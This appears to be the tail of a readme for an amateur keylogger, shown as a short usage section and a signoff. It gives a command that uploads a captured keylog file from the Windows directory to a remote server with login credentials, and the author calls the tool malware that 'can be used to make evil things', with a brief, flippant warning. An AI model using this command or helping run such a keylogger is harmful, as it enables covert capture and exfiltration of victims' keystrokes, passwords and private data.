	steal a log:
		Let's say you want a keylog from the 7. June 2005, just do so
		(imaging "Windows" is the windows directory):

			upload 'C:\Windows\mslog\070605.sys' 'server.com' 'user' 'pass'

		How easy ;D.

	outro:
		This is the first malware from me that can be used to make evil things.
		But please, just learn from it and don't bring yourself in trouble.
		Hav phun partyppl, see you next time...
